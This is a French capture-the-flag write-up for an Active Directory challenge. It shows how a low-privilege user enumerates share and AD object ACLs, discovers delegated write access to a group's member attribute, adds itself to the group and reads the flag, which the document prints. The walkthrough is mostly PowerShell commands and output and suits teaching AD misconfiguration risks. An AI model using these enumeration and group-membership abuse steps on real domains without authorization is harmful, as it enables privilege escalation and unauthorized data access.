# Ghost Membership

**Catégorie** : Active Directory/Réaliste  
**Difficulté** : Facile  
**Author**: HF47

## Description du challenge

Au sein de la station les accès sont strictement contrôlés. Pourtant, une faille subtile dans le système de délégation pourrait bien changer la donne. Saurez-vous en tirer parti pour franchir les niveaux de sécurité internes ?

## Solution

### 1. Reconnaissance initiale et identification du partage

Commençons par identifier notre contexte actuel avec PowerShell:

```powershell
# Identifier notre utilisateur actuel et ses groupes
whoami
whoami /groups
```

Nous constatons que nous sommes connectés en tant qu'utilisateur standard et membre du groupe `CTF_Player`.

Examinons ensuite les ressources réseau disponibles sur le domaine:

```powershell
# Lister les partages disponibles sur le contrôleur de domaine
net view \\dc1
```

Le résultat nous montre plusieurs partages, dont un nommé `flagshare` qui semble particulièrement intéressant:

```
Ressources partagées sur \\dc1

Nom du partage    Type        Utilisé comme    Commentaire
-------------------------------------------------------------------------------
ADMIN$            Disque      Distant          Administration à distance
C$                Disque      Distant          Partage par défaut
flagshare         Disque                       
IPC$              IPC         Distant          Appel de procédure distante
NETLOGON          Disque      Distant          Logon server share
SYSVOL            Disque      Distant          Logon server share
```

Le partage `flagshare` n'a pas de commentaire spécifique, mais son nom indique qu'il pourrait contenir le flag recherché.

### 2. Tentative d'accès au partage flagshare

Essayons de lister le contenu de ce partage:

```powershell
# Lister le contenu du partage flagshare
Get-ChildItem -Path "\\dc1\flagshare"
```

Nous arrivons à lister le contenu et voyons qu'il contient un fichier nommé `flag.txt`:

```
    Répertoire : \\dc1\flagshare

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        23/04/2025     14:30             45 flag.txt
```

Essayons maintenant de lire le contenu de ce fichier:

```powershell
# Tentative de lecture du fichier flag.txt
Get-Content "\\dc1\flagshare\flag.txt"
```

Cette tentative échoue avec une erreur d'accès refusé:

```
Get-Content : Accès refusé au chemin d'accès '\\dc1\flagshare\flag.txt'.
Au caractère Ligne:1 : 1
+ Get-Content "\\dc1\flagshare\flag.txt"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\dc1\flagshare\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Ce message d'erreur confirme que nous pouvons voir que le fichier existe, mais nous n'avons pas les permissions nécessaires pour lire son contenu.

### 3. Analyse des permissions sur le partage

Examinons les permissions sur le partage pour comprendre pourquoi nous ne pouvons pas lire ce fichier:

```powershell
# Vérifier notre accès au partage
net use \\dc1\flagshare

# Examiner les permissions NTFS sur le dossier partagé
icacls "\\dc1\flagshare"
```

L'analyse des ACL nous montre:

```
\\dc1\flagshare CTFCORP\Administrateurs:(OI)(CI)(F)
               SYSTÈME:(OI)(CI)(F)
               CTFCORP\CTF_Player:(RD)
               CTFCORP\CTF_Flag:(OI)(CI)(R)
```

Cette sortie nous révèle des informations cruciales:
- Le groupe `CTF_Player` (dont nous sommes membre) a uniquement le droit `RD` (Read & Execute Directory) sur le dossier
- Le groupe `CTF_Flag` a des droits de lecture `(OI)(CI)(R)` sur tous les fichiers du dossier
- `(OI)` signifie "Object Inherit" et `(CI)` signifie "Container Inherit", ce qui signifie que ces permissions s'appliquent à tous les fichiers et sous-dossiers

Cela explique pourquoi nous pouvons lister le contenu du dossier mais pas lire le fichier `flag.txt` - nous devons faire partie du groupe `CTF_Flag` pour y accéder.

### 4. Analyse des droits sur le groupe CTF_Flag

Examinons maintenant ce groupe `CTF_Flag` pour voir si nous pouvons nous y ajouter:

```powershell
# Obtenir des informations sur le groupe CTF_Flag
Get-ADGroup "CTF_Flag" -Properties *
```

Vérifions ensuite quels sont nos droits sur ce groupe:

```powershell
# Récupérer le groupe CTF_Flag
$group = Get-ADGroup "CTF_Flag"

# Examiner les ACLs sur ce groupe
$acl = Get-Acl "AD:$($group.DistinguishedName)"

# Filtrer pour trouver nos droits en tant que CTF_Player
$acl.Access | Where-Object { $_.IdentityReference -like "*CTF_Player*" }
```

Le résultat de cette dernière commande nous montre quelque chose d'intéressant:

```
ActiveDirectoryRights : WriteProperty
InheritanceType       : None
ObjectType            : bf9679c0-0de6-11d0-a285-00aa003049e2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : CTFCORP\CTF_Player
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

Nous découvrons que le groupe `CTF_Player` a le droit `WriteProperty` sur un attribut spécifique du groupe `CTF_Flag`, identifié par le GUID `bf9679c0-0de6-11d0-a285-00aa003049e2`.

Une recherche rapide nous indique que ce GUID correspond à l'attribut `member` dans Active Directory. Cela signifie que nous avons le droit d'ajouter des membres au groupe `CTF_Flag` !

> Note: Si vous souhaitez confirmer cette information sur le GUID, vous pouvez retrouver sa correspondance dans la documentation Microsoft ou utiliser des outils comme ADExplorer.

Théoriquement, nous pourrions également utiliser l'outil PowerView pour vérifier ces permissions, mais cet outil n'est généralement pas disponible par défaut sur les systèmes Windows:

```powershell
# Cette commande fonctionne si Powerview est installé
Get-DomainObjectAcl -Identity "CTF_Flag" | ? { $_.SecurityIdentifier -match $(ConvertTo-SID "CTF_Player") }
```

Nous pouvons également vérifier ces permissions avec la commande dsacls, qui est un outil natif Windows:

```powershell
# Vérifier les ACL avec dsacls
dsacls "CN=CTF_Flag,CN=Users,DC=ctfcorp,DC=local" | findstr /i "CTF_Player"
```

Cette commande nous montre également que le groupe CTF_Player a le droit de modifier l'attribut "member" du groupe CTF_Flag.

### 5. Exploitation de la vulnérabilité

Maintenant que nous savons que nous pouvons ajouter des membres au groupe `CTF_Flag`, nous allons abuser de cette délégation pour nous y ajouter:

```powershell
# S'ajouter au groupe CTF_Flag
Add-ADGroupMember -Identity "CTF_Flag" -Members $env:USERNAME

# Vérifier que nous sommes bien ajoutés
Get-ADGroupMember -Identity "CTF_Flag"
```

La commande s'exécute avec succès, et nous pouvons confirmer que notre utilisateur fait maintenant partie du groupe `CTF_Flag`.

Cependant, les changements de groupe en Active Directory ne sont pas immédiatement appliqués pour les sessions en cours. Pour que nos nouveaux droits soient pris en compte, nous devons forcer l'actualisation des tickets Kerberos:

```powershell
# Purger les tickets Kerberos pour forcer le rafraîchissement des droits
klist purge
```

Si cette commande ne fonctionne pas pour rafraîchir les droits, il peut être nécessaire d'ouvrir une nouvelle session RDP.

### 6. Accès au flag

Maintenant que nous sommes membres du groupe `CTF_Flag`, essayons à nouveau d'accéder au partage et de lire le flag:

```powershell
# Accéder au partage et lire le flag
Get-Content \\dc1\flagshare\flag.txt
```

Cette fois, la commande s'exécute avec succès et nous affiche le contenu du fichier:

```
404CTF{Wr1t3_M3mb3r5_1s_D4ng3r0us_R1ght!}
```
